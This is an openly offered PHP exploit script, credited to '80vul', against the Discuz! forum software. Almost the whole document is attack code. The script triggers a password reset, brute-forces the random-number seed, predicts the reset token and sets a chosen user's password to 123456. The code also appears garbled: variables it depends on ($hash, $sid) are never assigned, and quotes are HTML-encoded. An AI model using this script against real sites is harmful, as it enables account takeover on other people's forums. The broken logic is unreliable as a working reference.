Discuz! Remote Reset User Password Exploit
==========================================


#!/usr/bin/php
<?php

print_r(&#039;
+---------------------------------------------------------------------------+
Discuz! Reset User Password Exploit
by 80vul
+---------------------------------------------------------------------------+
&#039;);

if ($argc < 6) {
print_r(&#039;
+---------------------------------------------------------------------------+
Usage: php &#039;.$argv[0].&#039; host path user mail uid
host: target server (ip/hostname)
path: path to discuz
user: user login name
mail: user login mail
uid: user login id
Example:
php &#039;.$argv[0].&#039; localhost /discuz/ 80vul 80vul@80vul.com 2
+---------------------------------------------------------------------------+
&#039;);
exit;
}

error_reporting(7);
ini_set(&#039;max_execution_time&#039;, 0);

$host = $argv[1];
$path = $argv[2];
$user = $argv[3];
$mail = $argv[4];
$uid = $argv[5];

$fp = fsockopen($host, 80);

$data = "GET ".$path."viewthread.php HTTP/1.1\r\n";
$data .= "Host: $host\r\n";
$data .= "Keep-Alive: 300\r\n";
$data .= "Connection: keep-alive\r\n\r\n";

fputs($fp, $data);

$resp = &#039;&#039;;

while ($fp && !feof($fp)) {
$resp .= fread($fp, 1024);
if ($hash)
break;
}

if ($hash) {
$cmd = &#039;action=lostpasswd&username=&#039;.urlencode($user).&#039;&email=&#039;.urlencode($mail).&#039;&lostpwsubmit=true&formhash=&#039;.$hash[1];
$data = "POST ".$path."member.php HTTP/1.1\r\n";
$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
$data .= "Referer: http://$host$path\r\n";
$data .= "Host: $host\r\n";
$data .= "Content-Length: ".strlen($cmd)."\r\n";
$data .= "Connection: close\r\n\r\n";
$data .= $cmd;

fputs($fp, $data);

$resp = &#039;&#039;;

while ($fp && !feof($fp))
$resp .= fread($fp, 1024);

fclose($fp);


if (!$sid)
exit("Exploit Failed!\n");

$seed = getseed();
if ($seed) {
mt_srand($seed);
random();
mt_rand();
$id = random();

$fp = fsockopen($host, 80);

$cmd = &#039;action=getpasswd&uid=&#039;.$uid.&#039;&id=&#039;.$id.&#039;&newpasswd1=123456&newpasswd2=123456&getpwsubmit=true&formhash=&#039;.$hash[1];
$data = "POST ".$path."member.php HTTP/1.1\r\n";
$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
$data .= "Referer: http://$host$path\r\n";
$data .= "Host: $host\r\n";
$data .= "Content-Length: ".strlen($cmd)."\r\n";
$data .= "Connection: close\r\n\r\n";
$data .= $cmd;

fputs($fp, $data);

$resp = &#039;&#039;;

while ($fp && !feof($fp))
$resp .= fread($fp, 1024);

if (strpos($resp, &#039;?????????,?????????&#039;) !== false)
exit("Expoilt Success!\nUser New Password:\t123456\n");
else
exit("Exploit Failed!\n");
} else
exit("Exploit Failed!\n");
} else
exit("Exploit Failed!\n");

function getseed()
{
global $sid;

for ($seed = 0; $seed <= 1000000; $seed ++) {
mt_srand($seed);
$id = random(6);
if ($id == $sid[1])
return $seed;
}
return false;
}

function random($length = 6)
{
$hash = &#039;&#039;;
$chars = &#039;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#039;;
$max = strlen($chars) - 1;
for ($i = 0; $i < $length; $i ++)
$hash .= $chars[mt_rand(0, $max)];

return $hash;
}

?>




